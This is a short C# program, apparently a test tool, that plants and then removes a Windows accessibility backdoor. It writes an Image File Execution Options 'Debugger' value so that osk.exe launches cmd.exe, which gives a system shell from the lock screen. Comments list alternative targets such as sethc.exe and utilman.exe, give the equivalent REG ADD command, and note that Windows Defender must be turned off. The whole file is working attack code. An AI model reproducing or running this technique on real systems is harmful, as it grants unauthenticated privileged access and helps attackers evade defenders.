using System;
using Microsoft.Win32;

namespace regAdd
{
    class Program
    {
        static void removeReg(string path)
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path, true))
            {
                if (key != null)
                {
                    Console.WriteLine("Backdoor found... deleting backdoor.");
                    Registry.LocalMachine.DeleteSubKeyTree(path);
                }
            }
        } 
        static void Main()
        {
            string path = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
            //Other possiblities: sethc.exe ,utilman.exe, narrator.exe, magnify.exe, displayswitch.exe
            string backdoorbin = "osk.exe";
            string backdoor = path + backdoorbin;

            removeReg(backdoor);
            //REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
            //Image File Execution Options\$FILES" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
            RegistryKey newkey = Registry.LocalMachine.CreateSubKey(backdoor);
            //Note: this causes Windows Defender to trip.  Must turn off to test.
            Console.WriteLine("Creating new key...");
            newkey.SetValue("Debugger", @"C:\Windows\System32\cmd.exe");

            Console.WriteLine($"Press any key to exit & remove registry key\r\nBackdoor: {backdoor}.");
            Console.ReadLine();
            //Check with:
            //Get-Item "HKLM:\\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
            //Lock computer & open osk to see if it worked.
            Console.WriteLine($"Deleting SubKey: {backdoor}");
            removeReg(backdoor);
            newkey.Close();


        }
    }
}
